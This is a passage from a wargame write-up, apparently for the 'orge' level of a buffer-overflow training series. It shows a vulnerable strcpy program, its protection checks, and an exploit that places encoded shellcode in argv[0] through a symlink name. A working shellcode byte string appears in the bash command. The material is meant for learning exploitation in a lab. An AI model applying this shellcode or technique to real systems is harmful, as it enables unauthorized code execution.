# Vulnerability
```c
char buffer[40];
strcpy(buffer, argv[1]);
```
This program uses strcpy() that does not check boundary.

So, I can overwrite SFP & RET address.

Protection code is:
```c
// here is changed
if(argc != 2){
  printf("argc must be two!\n");
  exit(0);
}

// egghunter 
for(i=0; environ[i]; i++)
  memset(environ[i], 0, strlen(environ[i]));

if(argv[1][47] != '\xbf')
{
  printf("stack is still your friend.\n");
  exit(0);
}

// check the length of argument
if(strlen(argv[1]) > 48){
  printf("argument is too long!\n");
  exit(0);
}
```
The protection that checks argc is 2 or not is added.

# Exploitation
As the program does not reset argv[0], I will pass shellcode in program's name.

```
----------------------------------------------
| NOP(40) | AAAA(4) | RET(argv[0]'s address) |
----------------------------------------------
```

To give shellcode in argv[0], I used `ln -s`:
```bash
[orge@192 orge]$ ln -s /home/orge/asdfa /home/orge/`python -c 'print "\x90"*40+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x90"*10'`
[orge@192 orge]$
```
